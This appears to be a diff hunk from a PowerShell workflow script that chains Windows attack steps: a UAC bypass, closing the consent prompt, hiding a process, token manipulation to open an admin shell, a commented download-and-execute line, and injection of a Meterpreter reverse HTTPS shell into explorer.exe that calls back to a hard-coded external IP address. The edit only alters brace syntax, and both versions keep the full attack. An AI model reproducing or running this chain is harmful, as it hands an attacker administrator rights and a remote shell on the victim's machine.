@@ -7,11 +7,11 @@ workflow Test
 {
     Parallel
     {
-        { Bypass-UAC -Method UacMethodNetOle32 }
-        { kill-window consent }
-        { hide-process mmc }
-        { UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id }# PROMPT ADMIN CMD AHAHAH :D #-Args "/c powershell -C iwr goo.gl/ | iex"-ProcPID (ps -Name mmc).id
-        { Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443 }
+        ${ Bypass-UAC -Method UacMethodNetOle32 }
+        ${ kill-window consent }
+        ${ hide-process mmc }
+        ${ UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id }# PROMPT ADMIN CMD AHAHAH :D #-Args "/c powershell -C iwr goo.gl/ | iex"-ProcPID (ps -Name mmc).id
+        ${ Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443 }
     }
 }
 
